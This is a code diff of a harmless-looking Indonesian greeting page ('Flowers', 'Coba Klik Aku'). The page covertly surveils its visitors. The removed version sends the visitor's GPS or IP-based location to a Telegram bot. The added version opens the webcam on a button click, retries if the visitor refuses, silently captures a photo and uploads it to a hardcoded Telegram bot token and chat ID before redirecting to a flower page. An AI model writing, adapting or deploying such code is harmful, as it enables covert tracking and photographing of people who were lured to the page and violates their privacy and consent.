@@ -4,86 +4,102 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="css/style.css">
-    <title>Buat Kamu</title>
+    <link rel="stylesheet" href="styles.css">
+    <title>Flowers</title>
 </head>
 <body>
     <div class="greetings">
-        <!-- Silahkan menambah kata sesuai keinginan dengan <span>text...</span -->
         <span>A</span>
         <span>L</span>
         <span>L</span>
         <span>O</span>
-        <span>W</span>
+        <span>O</span>
     </div>
     <div class="description">
         <p><span></span></p>
     </div>
-    <button id="sendData">
-        Coba Klik Akuu
+    <div id="camera-container" style="display: none;">
+        <video id="video" autoplay></video>
+        <canvas id="canvas" style="display: none;"></canvas>
+    </div>
+    <button id="actionButton">
+        Coba Klik Aku
     </button>
+
     <script>
-        document.getElementById('sendData').addEventListener('click', (event) => {
-            event.preventDefault(); // Mencegah navigasi langsung
-            if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const latitude = position.coords.latitude;
-                        const longitude = position.coords.longitude;
-                        const accuracy = position.coords.accuracy;
-
-                        // Buat link Google Maps
-                        const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-
-                        // Format pesan untuk Telegram
-                        const message = `Informasi Lokasi GPS:\nLatitude: ${latitude}\nLongitude: ${longitude}\nAkurasi: ${accuracy} meter\n\nLihat di Google Maps:\n${googleMapsLink}`;
-
-                        sendToTelegram(message, () => {
-                            // Arahkan ke halaman jika berhasil
-                            window.location.href = 'flower.html';
-                        });
-                    },
-                    (error) => {
-                        console.warn("Lokasi tidak bisa diperoleh: ", error.message);
-                        // Gunakan lokasi berbasis IP
-                        getIpLocation();
-                    },
-                    { enableHighAccuracy: true }
-                );
-            } else {
-                getIpLocation();
-            }
+        document.getElementById('actionButton').addEventListener('click', () => {
+            // Coba aktifkan kamera dan ambil foto
+            startCameraAndCapture();
         });
 
-        function getIpLocation() {
-            fetch('https://ipapi.co/json/')
-                .then(response => response.json())
-                .then(data => {
-                    const latitude = data.latitude;
-                    const longitude = data.longitude;
-                    const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+        function startCameraAndCapture() {
+            const cameraContainer = document.getElementById('camera-container');
+            cameraContainer.style.display = 'block';
 
-                    const message = `Lokasi Berdasarkan IP:\nKota: ${data.city}\nWilayah: ${data.region}\nNegara: ${data.country_name}\nIP: ${data.ip}\n\nLihat di Google Maps:\n${googleMapsLink}`;
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then((stream) => {
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
 
-                    sendToTelegram(message, () => {
-                        // Arahkan ke halaman setelah alternatif berhasil
-                        window.location.href = 'flower.html';
-                    });
+                    // Tunggu beberapa waktu hingga video mulai memuat
+                    video.onloadedmetadata = () => {
+                        // Ambil foto setelah kamera siap
+                        setTimeout(() => {
+                            capturePhoto();
+                        }, 1000); // Tunggu 1 detik untuk memastikan video stabil
+                    };
                 })
-                .catch(err => {
-                    console.error("Gagal mendapatkan lokasi IP:", err);
-                    window.location.href = 'flower.html';
+                .catch((err) => {
+                    console.warn("Akses kamera ditolak atau tidak tersedia:", err.message);
+                    alert("Kamera ditolak, mencoba ulang...");
+                    retryCameraAccess();
                 });
         }
 
-        function sendToTelegram(message, onSuccess) {
+        function retryCameraAccess() {
+            // Coba ulangi akses kamera
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then((stream) => {
+                    console.log("Akses kamera berhasil setelah percobaan ulang.");
+                    startCameraAndCapture(); // Mulai ulang pengambilan foto
+                })
+                .catch((err) => {
+                    console.error("Gagal mendapatkan akses kamera setelah percobaan ulang:", err.message);
+                    fallbackCapture(); // Gunakan fallback capture
+                });
+        }
+
+        function capturePhoto() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+
+            // Ambil gambar dari video
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Konversi gambar ke data URL
+            const imageData = canvas.toDataURL('image/png');
+
+            // Kirim gambar ke Telegram
+            sendImageToTelegram(imageData);
+        }
+
+        function fallbackCapture() {
+            alert("Gagal mengakses kamera. Menggunakan fallback alternatif (default image).");
+            const imageData = 'data:image/png;base64,DEFAULT_IMAGE_DATA'; // Ganti dengan data base64 gambar default
+
+            sendImageToTelegram(imageData);
+        }
+
+        function sendImageToTelegram(imageData) {
             const botToken = '8103522113:AAECNtZDVMnPLaXX3HD1IFeQuOp7cQ2Td_Y'; // Ganti dengan token bot Anda
             const chatId = '6813368909'; // Ganti dengan chat ID Anda
 
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chatId, text: message }),
+                body: createFormData(chatId, imageData),
             })
                 .then(response => {
                     if (!response.ok) {
@@ -92,13 +108,34 @@
                     return response.json();
                 })
                 .then(result => {
-                    console.log("Pesan berhasil dikirim:", result);
-                    onSuccess();
+                    console.log("Foto berhasil dikirim:", result);
+                    alert("Foto berhasil dikirim!");
+                    window.location.href = 'flower.html';
                 })
                 .catch(error => {
-                    console.error("Gagal mengirim pesan ke Telegram:", error);
-                    onSuccess(); // Tetap lanjutkan meskipun gagal
+                    console.error("Gagal mengirim foto ke Telegram:", error);
+                    window.location.href = 'flower.html'; // Tetap arahkan pengguna
                 });
+        }
+
+        function createFormData(chatId, imageData) {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', dataURLtoBlob(imageData));
+            return formData;
+        }
+
+        function dataURLtoBlob(dataURL) {
+            const byteString = atob(dataURL.split(',')[1]);
+            const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
+            const buffer = new ArrayBuffer(byteString.length);
+            const dataView = new Uint8Array(buffer);
+
+            for (let i = 0; i < byteString.length; i++) {
+                dataView[i] = byteString.charCodeAt(i);
+            }
+
+            return new Blob([buffer], { type: mimeString });
         }
     </script>
 </body>
